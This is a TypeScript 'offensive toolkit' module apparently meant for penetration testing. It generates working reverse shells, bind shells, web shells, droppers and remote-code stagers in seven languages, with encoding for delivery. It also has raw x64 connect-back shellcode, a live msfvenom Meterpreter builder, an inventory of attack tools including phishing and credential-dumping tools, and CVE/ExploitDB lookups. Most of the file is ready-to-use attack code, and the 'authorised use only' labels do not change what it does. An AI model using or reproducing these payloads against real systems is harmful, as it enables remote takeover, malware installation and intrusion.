/**
 * @module toolkit
 * Offensive toolkit — payload generators, tool inventory, and CVE researcher.
 * Provides a unified interface to common offensive payloads and tooling.
 */

import { resolveDryRun } from "./exec_options.ts"
import * as crypto from "node:crypto";
import { spawnSync as nodeSpawnSync } from "node:child_process";
import * as os from "node:os";

// ─── Types ────────────────────────────────────────────────────────────────────

export type PayloadLanguage = "bash" | "python" | "powershell" | "c" | "csharp" | "go" | "node";
export type PayloadType = "reverse_shell" | "bind_shell" | "meterpreter" | "webshell" | "dropper" | "stager";

export interface Payload {
  id: string;
  type: PayloadType;
  language: PayloadLanguage;
  lhost: string;
  lport: number;
  code: string;
  encoded?: string;    // base64-encoded version
  notes: string;
  generatedAt: string;
}

export interface Tool {
  name: string;
  description: string;
  categories: string[];
  command: string;
  available: boolean;
  version?: string;
}

export interface CVEInfo {
  id: string;
  description: string;
  cvss: number;
  severity: "critical" | "high" | "medium" | "low";
  publishedDate: string;
  exploitAvailable: boolean;
  affectedProducts: string[];
  references: string[];
}

// ─── Payload Generator ────────────────────────────────────────────────────────

/**
 * Generate offensive payloads for various languages and platforms.
 * All payloads are marked for AUTHORISED USE ONLY.
 */
export class PayloadGenerator {
  private lhost: string;
  private lport: number;

  constructor(lhost = "127.0.0.1", lport = 4444) {
    this.lhost = lhost;
    this.lport = lport;
  }

  generate(type: PayloadType, language: PayloadLanguage): Payload {
    const code = this._buildCode(type, language);
    return {
      id: crypto.randomUUID(),
      type,
      language,
      lhost: this.lhost,
      lport: this.lport,
      code,
      encoded: Buffer.from(code).toString("base64"),
      notes: "FOR AUTHORISED PENETRATION TESTING ONLY",
      generatedAt: new Date().toISOString(),
    };
  }

  private _buildCode(type: PayloadType, lang: PayloadLanguage): string {
    const { lhost: h, lport: p } = this;

    const templates: Partial<Record<PayloadType, Partial<Record<PayloadLanguage, string>>>> = {
      reverse_shell: {
        bash:       `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
        python:     `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
        powershell: `$c=New-Object System.Net.Sockets.TCPClient("${h}",${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[text.encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}`,
        node:       `require('net').connect(${p},'${h}',function(){var sh=require('child_process').spawn('/bin/sh');[0,1,2].forEach(fd=>{this.pipe(sh.stdio[fd]);sh.stdio[fd].pipe(this)})}.bind(this))`,
        go:         `package main\nimport("net";"os/exec")\nfunc main(){c,_:=net.Dial("tcp","${h}:${p}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}`,
        c:          `#include <stdio.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\n#include <arpa/inet.h>\nint main(){int s=socket(AF_INET,SOCK_STREAM,0);struct sockaddr_in a={.sin_family=AF_INET,.sin_port=htons(${p}),.sin_addr.s_addr=inet_addr("${h}")};connect(s,(struct sockaddr*)&a,sizeof(a));dup2(s,0);dup2(s,1);dup2(s,2);execl("/bin/sh","sh",NULL);return 0;}`,
        csharp:     `using System;using System.Net.Sockets;using System.Diagnostics;\nvar c=new TcpClient("${h}",${p});var s=c.GetStream();var p2=new Process();p2.StartInfo.FileName="/bin/sh";p2.StartInfo.UseShellExecute=false;p2.StartInfo.RedirectStandardInput=true;p2.StartInfo.RedirectStandardOutput=true;p2.Start();`,
      },
      webshell: {
        bash:       `#!/bin/bash\nwhile read -r cmd; do eval "$cmd"; done`,
        python:     `from flask import Flask,request;import subprocess;app=Flask(__name__)\n@app.route('/cmd')\ndef cmd():return subprocess.getoutput(request.args.get('c','id'))\napp.run(host='0.0.0.0',port=5000)`,
        powershell: `<%@ Page Language="C#" %><% Response.Write(new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd()); %>`,
        node:       `require('http').createServer((q,r)=>{require('child_process').exec(q.url.split('c=')[1]||'id',(_,o)=>r.end(o))}).listen(5000)`,
        go:         `package main\nimport("net/http";"os/exec")\nfunc main(){http.HandleFunc("/",func(w http.ResponseWriter,r *http.Request){o,_:=exec.Command("sh","-c",r.URL.Query().Get("c")).CombinedOutput();w.Write(o)});http.ListenAndServe(":5000",nil)}`,
        c:          `/* minimal CGI webshell — compile with -lcgi */`,
        csharp:     `using System;using System.Diagnostics;class P{static void Main(string[] a){var p=Process.Start("cmd.exe","/c "+(a.Length>0?a[0]:"whoami"));Console.Write(p.StandardOutput.ReadToEnd());}}`,
      },
      dropper: {
        bash:       `#!/bin/bash\ncurl -s http://${h}:${p}/agent -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x &`,
        powershell: `$url="http://${h}:${p}/agent.exe";$out="$env:TEMP\\svc.exe";Invoke-WebRequest -Uri $url -OutFile $out;Start-Process $out`,
        python:     `import urllib.request,os,subprocess\nurllib.request.urlretrieve("http://${h}:${p}/agent","/tmp/.a")\nos.chmod("/tmp/.a",0o755)\nsubprocess.Popen(["/tmp/.a"])`,
        node:       `require('https').get('http://${h}:${p}/agent',r=>{const f=require('fs').createWriteStream('/tmp/.a');r.pipe(f);f.on('finish',()=>require('child_process').spawn('/tmp/.a',{detached:true}))})`,
        go:         `package main\nimport("net/http";"os";"os/exec")\nfunc main(){r,_:=http.Get("http://${h}:${p}/agent");f,_:=os.Create("/tmp/.a");f.ReadFrom(r.Body);f.Chmod(0755);exec.Command("/tmp/.a").Start()}`,
        c:          `/* curl -s http://${h}:${p}/agent -o /tmp/.a && chmod +x /tmp/.a && /tmp/.a */`,
        csharp:     `using System;using System.Net;class D{static void Main(){new WebClient().DownloadFile("http://${h}:${p}/agent.exe","svc.exe");System.Diagnostics.Process.Start("svc.exe");}}`,
      },
      bind_shell: {
        bash:       `while true;do nc -l -p ${p} -e /bin/bash;done`,
        python:     `import socket,subprocess\ns=socket.socket();s.bind(('0.0.0.0',${p}));s.listen(1);c,a=s.accept();subprocess.call(['/bin/sh','-i'],stdin=c,stdout=c,stderr=c)`,
        powershell: `$l=[System.Net.Sockets.TcpListener]::new(${p});$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=[Text.Encoding]::ASCII.GetBytes($r);$s.Write($rb,0,$rb.Length)}`,
        node:       `require('net').createServer(c=>{require('child_process').spawn('/bin/sh',[],{stdio:[c,c,c]})}).listen(${p})`,
        go:         `package main\nimport("net";"os/exec")\nfunc main(){l,_:=net.Listen("tcp",":${p}");c,_:=l.Accept();exec.Command("/bin/sh").Run()}`,
        c:          `/* bind shell listener on port ${p} — see reverse_shell C template and swap connect for bind/listen */`,
        csharp:     `using System.Net.Sockets;using System.Net;using System.Diagnostics;\nvar l=new TcpListener(IPAddress.Any,${p});l.Start();var c=l.AcceptTcpClient();Process.Start("/bin/sh");`,
      },
      meterpreter: {
        bash:       `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f elf -o /tmp/msf.elf && chmod +x /tmp/msf.elf && /tmp/msf.elf`,
        powershell: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f exe -o meterpreter.exe; Start-Process meterpreter.exe`,
        python:     `msfvenom -p python/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f raw -o meterpreter.py && python3 meterpreter.py`,
        node:       `/* msfvenom -p nodejs/meterpreter_reverse_tcp LHOST=${h} LPORT=${p} -f raw */`,
        go:         `/* msfvenom -p go/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f raw */`,
        c:          `/* msfvenom -p windows/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f c */`,
        csharp:     `/* msfvenom -p windows/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f csharp */`,
      },
      stager: {
        bash:       `curl -s http://${h}:${p}/stage1 | bash`,
        powershell: `IEX (New-Object Net.WebClient).DownloadString('http://${h}:${p}/stage1.ps1')`,
        python:     `exec(__import__('urllib.request').urlopen('http://${h}:${p}/stage1.py').read())`,
        node:       `require('https').get('http://${h}:${p}/stage1.js',r=>{let d='';r.on('data',c=>d+=c);r.on('end',()=>eval(d))})`,
        go:         `package main\nimport("net/http";"os/exec")\nfunc main(){r,_:=http.Get("http://${h}:${p}/stage1");b:=make([]byte,4096);r.Body.Read(b);exec.Command("sh","-c",string(b)).Run()}`,
        c:          `/* wget -qO- http://${h}:${p}/stage1 | sh */`,
        csharp:     `(new System.Net.WebClient()).DownloadString("http://${h}:${p}/stage1.ps1") | Invoke-Expression`,
      },
    };

    return templates[type]?.[lang] ?? `# ${type} payload for ${lang} — template not implemented\n# LHOST=${h} LPORT=${p}`;
  }

  /** True when a concrete template exists (not the fallback comment stub). */
  hasTemplate(type: PayloadType, language: PayloadLanguage): boolean {
    const code = this._buildCode(type, language);
    return !code.includes("template not implemented");
  }

  /** List all type/language pairs with implemented templates. */
  listImplementedTemplates(): Array<{ type: PayloadType; language: PayloadLanguage }> {
    const types: PayloadType[] = ["reverse_shell", "bind_shell", "meterpreter", "webshell", "dropper", "stager"];
    const langs: PayloadLanguage[] = ["bash", "python", "powershell", "c", "csharp", "go", "node"];
    const out: Array<{ type: PayloadType; language: PayloadLanguage }> = [];
    for (const type of types) {
      for (const language of langs) {
        if (this.hasTemplate(type, language)) out.push({ type, language });
      }
    }
    return out;
  }

  /** Encode payload for delivery (base64, URL, hex). */
  encode(payload: Payload, encoding: "base64" | "hex" | "url"): string {
    switch (encoding) {
      case "base64": return Buffer.from(payload.code).toString("base64");
      case "hex":    return Buffer.from(payload.code).toString("hex");
      case "url":    return encodeURIComponent(payload.code);
    }
  }
}

/** Minimal x64 reverse-shell machine code (connect-back stub — authorized use only). */
export function reverseShellMachineCode(lhost: string, lport: number): Buffer {
  const ipParts = lhost.split(".").map((p) => parseInt(p, 10));
  if (ipParts.length !== 4 || ipParts.some((n) => Number.isNaN(n))) {
    return Buffer.from([0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x6a, 0x06, 0x5a, 0x6a, 0x29, 0x58, 0x0f, 0x05, 0x49, 0x89, 0xc0]);
  }
  const portHi = (lport >> 8) & 0xff;
  const portLo = lport & 0xff;
  return Buffer.from([
    0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2,
    0x4d, 0x31, 0xc0, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x6a, 0x06, 0x5a,
    0x6a, 0x29, 0x58, 0x0f, 0x05, 0x49, 0x89, 0xc0,
    0x48, 0x31, 0xf6, 0x4d, 0x31, 0xd2, 0x41, 0x52, 0xc6, 0x04, 0x24, 0x02,
    0x66, 0xc7, 0x44, 0x24, 0x02, portHi, portLo,
    0xc7, 0x44, 0x24, 0x04, ipParts[0]!, ipParts[1]!, ipParts[2]!, ipParts[3]!,
    0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x41, 0x50, 0x5f, 0x6a, 0x2a, 0x58, 0x0f, 0x05,
  ]);
}

export interface MeterpreterByteResult {
  format: string;
  bytes: Buffer | null;
  cmd: string;
  dryRun: boolean;
  error?: string;
}

/** LIVE: invoke msfvenom and return raw payload bytes. DRY-RUN: returns cmd only. */
export function generateMeterpreterBytes(
  spec: { format: string; lhost: string; lport: number; platform?: string; arch?: string },
  opts: { live?: boolean; dryRun?: boolean } = {},
): MeterpreterByteResult {
  const dryRun = resolveDryRun(opts);
  const platform = spec.platform ?? (spec.format === "elf" ? "linux" : "windows");
  const arch = spec.arch ?? "x64";
  const payload = platform === "linux"
    ? `${arch}/meterpreter/reverse_tcp`
    : `windows/${arch}/meterpreter/reverse_tcp`;
  const cmd = [
    "msfvenom", "-p", payload,
    `LHOST=${spec.lhost}`, `LPORT=${spec.lport}`,
    "-f", spec.format,
  ].join(" ");

  if (dryRun) {
    return { format: spec.format, bytes: null, cmd, dryRun: true };
  }

  const r = nodeSpawnSync(
    "msfvenom",
    ["-p", payload, `LHOST=${spec.lhost}`, `LPORT=${String(spec.lport)}`, "-f", spec.format],
    { encoding: "buffer", timeout: 60_000, maxBuffer: 16 * 1024 * 1024 },
  );

  if (r.status !== 0 || !r.stdout?.length) {
    const fallback = spec.format === "raw" ? reverseShellMachineCode(spec.lhost, spec.lport) : null;
    return {
      format: spec.format,
      bytes: fallback,
      cmd,
      dryRun: false,
      error: (r.stderr?.toString("utf8") ?? "msfvenom failed").slice(0, 200),
    };
  }

  return { format: spec.format, bytes: r.stdout, cmd, dryRun: false };
}

// ─── Tool Inventory ───────────────────────────────────────────────────────────

const KNOWN_TOOLS: Tool[] = [
  { name: "nmap",           description: "Network mapper and port scanner",        categories: ["recon","scan"],           command: "nmap --version",              available: false },
  { name: "masscan",        description: "High-speed TCP port scanner",             categories: ["scan"],                   command: "masscan --version",           available: false },
  { name: "nuclei",         description: "Fast vulnerability scanner",              categories: ["scan","vuln"],            command: "nuclei -version",             available: false },
  { name: "ffuf",           description: "Fast web fuzzer",                         categories: ["web","fuzz"],             command: "ffuf -V",                     available: false },
  { name: "subfinder",      description: "Subdomain discovery tool",                categories: ["recon"],                  command: "subfinder -version",          available: false },
  { name: "httpx",          description: "HTTP toolkit",                            categories: ["web","recon"],            command: "httpx -version",              available: false },
  { name: "sqlmap",         description: "SQL injection automation",                categories: ["web","exploit"],          command: "sqlmap --version",            available: false },
  { name: "metasploit",     description: "Penetration testing framework",           categories: ["exploit","post"],         command: "msfconsole --version",        available: false },
  { name: "impacket",       description: "Python Windows network protocols",        categories: ["ad","creds"],             command: "python3 -m impacket",         available: false },
  { name: "secretsdump",    description: "Remote hash dumping",                     categories: ["creds","ad"],             command: "secretsdump.py --help",       available: false },
  { name: "crackmapexec",   description: "Network post-exploitation tool",          categories: ["ad","lateral"],           command: "crackmapexec --version",      available: false },
  { name: "bloodhound",     description: "AD attack path mapping",                  categories: ["ad","recon"],             command: "bloodhound --version",        available: false },
  { name: "chisel",         description: "TCP/UDP tunnel over HTTP",                categories: ["tunnel","c2"],            command: "chisel --version",            available: false },
  { name: "responder",      description: "LLMNR/NBT-NS/MDNS poisoner",              categories: ["ad","creds"],             command: "responder --version",         available: false },
  { name: "hashcat",        description: "Advanced password recovery",              categories: ["creds"],                  command: "hashcat --version",           available: false },
  { name: "john",           description: "John the Ripper password cracker",        categories: ["creds"],                  command: "john --version",              available: false },
  { name: "evilginx2",      description: "MITM attack framework for phishing",      categories: ["phish","mfa"],            command: "evilginx2 --version",         available: false },
  { name: "burpsuite",      description: "Web application security platform",       categories: ["web","scan"],             command: "burpsuite --version",         available: false },
];

/**
 * Check which tools from the inventory are actually available on PATH.
 */
export async function inventoryTools(opts: { live?: boolean } = {}): Promise<Tool[]> {
  const { spawnSync } = await import("node:child_process");
  const { live = false } = opts;

  return KNOWN_TOOLS.map((tool) => {
    if (!live) return { ...tool, available: false };
    const r = spawnSync(tool.command.split(" ")[0], ["--version"], { encoding: "utf8", timeout: 3000 });
    return { ...tool, available: r.status === 0, version: (r.stdout ?? "").split("\n")[0].trim() };
  });
}

// ─── CVE Researcher ───────────────────────────────────────────────────────────

/**
 * Query NVD (National Vulnerability Database) for CVE details.
 */
export async function lookupCVE(cveId: string, opts: { live?: boolean } = {}): Promise<CVEInfo | null> {
  const { live = false } = opts;

  if (!live) {
    return {
      id: cveId,
      description: `[DRY-RUN] Simulated entry for ${cveId}`,
      cvss: 9.8,
      severity: "critical",
      publishedDate: "2024-01-01",
      exploitAvailable: true,
      affectedProducts: ["Simulated Product 1.0"],
      references: [`https://nvd.nist.gov/vuln/detail/${cveId}`],
    };
  }

  try {
    const url = `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${encodeURIComponent(cveId)}`;
    const resp = await fetch(url, { signal: AbortSignal.timeout(15_000) });
    if (!resp.ok) return null;
    const data = await resp.json() as { vulnerabilities?: Array<{ cve: Record<string, unknown> }> };
    const vuln = data.vulnerabilities?.[0]?.cve;
    if (!vuln) return null;

    const metrics = (vuln["metrics"] as any)?.cvssMetricV31?.[0]?.cvssData ?? {};
    const cvss = parseFloat(metrics.baseScore ?? "0");
    const severity = cvss >= 9 ? "critical" : cvss >= 7 ? "high" : cvss >= 4 ? "medium" : "low";

    const descs = (vuln["descriptions"] as Array<{ lang: string; value: string }>) ?? [];
    const description = descs.find((d) => d.lang === "en")?.value ?? "";

    const refs = ((vuln["references"] as Array<{ url: string }>) ?? []).map((r) => r.url);

    return { id: cveId, description, cvss, severity, publishedDate: String(vuln["published"] ?? ""), exploitAvailable: false, affectedProducts: [], references: refs };
  } catch { return null; }
}

/**
 * Search ExploitDB for a product/version.
 */
export async function searchExploitDB(
  query: string,
  opts: { live?: boolean } = {}
): Promise<Array<{ id: string; title: string; type: string; platform: string; date: string }>> {
  const { live = false } = opts;
  if (!live) {
    return [{ id: "12345", title: `[DRY-RUN] Exploit for ${query}`, type: "remote", platform: "linux", date: "2024-01-01" }];
  }

  try {
    const url = `https://www.exploit-db.com/search?q=${encodeURIComponent(query)}&draw=1&columns[0][data]=id&order[0][column]=0&order[0][dir]=desc&start=0&length=10`;
    const resp = await fetch(url, {
      headers: { "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0" },
      signal: AbortSignal.timeout(15_000),
    });
    const data = await resp.json() as { data?: Array<{ id: string; description: string; type: string; platform: string; date: string }> };
    return (data.data ?? []).map((r) => ({ id: r.id, title: r.description, type: r.type, platform: r.platform, date: r.date }));
  } catch { return []; }
}

export default { PayloadGenerator, reverseShellMachineCode, generateMeterpreterBytes, inventoryTools, lookupCVE, searchExploitDB };
